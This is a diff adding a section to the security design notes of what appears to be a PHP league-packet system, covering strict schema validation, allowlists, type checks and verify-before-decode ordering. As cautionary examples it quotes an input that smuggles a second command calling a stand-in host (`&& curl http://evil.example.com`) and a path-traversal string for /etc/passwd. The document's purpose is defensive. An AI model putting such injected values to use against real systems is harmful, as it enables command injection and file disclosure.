@@ -1388,7 +1388,35 @@ at all: it is in enrolment and in sending. Our site takes a URL from a remote pa
   JWT implementations were broken.
 - Keys from `random_bytes()`, one per pairing, rotated with an overlap window.
 
-**Parsing.** `json_decode` with depth and size caps, associative mode, never `unserialize()`.
+**Parsing.** The specification lives in `IDO_League_Packet`, one declared field at a time, with a
+type and a range for each. Three properties of it are worth naming, because each answers a different
+attack:
+
+- **An undeclared field is an error, not something ignored.** Ignoring lets an attacker add fields
+  and watch for a change in behaviour, and makes a version mismatch fail silently rather than
+  clearly. The validated array is also rebuilt from the specification rather than passed through, so
+  nothing undeclared survives even by accident.
+- **A packet type with no specification is refused.** `war` and `result` are designed and not yet
+  built, so a packet claiming to be one is turned away. A handler that accepts a type it cannot
+  validate is worse than one that admits it does not know the type yet.
+- **Types are checked, not coerced.** `is_int()`, not `is_numeric()`: the string `"14"`, the float
+  `14.5` and `true` are all refused where a number belongs. A peer sending a string where a number
+  goes is running different code, which is worth knowing rather than papering over.
+
+Text fields face an allowlist rather than a denylist, and that distinction was earned: the first
+version banned the characters that only appear in attacks, which let
+`Northmarch && curl http://evil.example.com` and `../../../../etc/passwd` through, since neither uses
+a character anybody thinks to ban. A denylist answers "is this one of the bad things I thought of";
+an allowlist answers "is this a name".
+
+Dates are matched against a fixed shape and never handed to `strtotime()`, which would cheerfully
+accept `now`, `+1 year` and `tomorrow` from a peer.
+
+Decoding is private and reachable only through `IDO_League_Crypto::open()`, which verifies first.
+The order of operations is the security property, so it is enforced by the class rather than
+described in a comment above two public methods.
+
+`json_decode` with depth and size caps, associative mode, never `unserialize()`.
 Whitelist every field and reject unknown keys. Nothing from a packet becomes a filename, a path, a
 shell argument, a SQL fragment or an included file. If compression is ever accepted, cap the
 decompressed size, because a compression bomb is trivial otherwise.
